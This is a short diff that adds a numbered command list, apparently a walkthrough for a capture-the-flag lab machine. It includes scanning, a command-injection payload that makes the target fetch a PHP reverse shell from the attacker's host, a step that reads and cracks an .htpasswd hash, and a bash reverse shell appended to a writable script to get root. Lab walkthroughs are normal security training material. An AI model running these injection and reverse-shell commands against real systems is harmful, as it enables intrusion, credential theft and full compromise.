@@ -1,0 +1,11 @@
+1 - nmap -A 10.10.207.119
+2 - gobuster dir -u http://10.10.207.119 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+3 - cp /usr/share/webshells/php/php-reverse-shell.php .
+4 - Burp Suite -> Repeater -> yt_url=`wget${IFS}http://10.8.94.51:8000/php-reverse-shell.php`
+5 - cat /var/www/html/admin/flag.txt
+6 - cat /var/www/html/admin/.htpasswd
+7 - john hash -w=/usr/share/wordlists/rockyou.txt
+8 - http://10.10.207.119/admin
+9 - echo 'bash -i >& /dev/tcp/10.8.94.51/4445 0>&1' >> /var/www/html/tmp/clean.sh
+10 - whoami
+11 - cat /root/root.txt
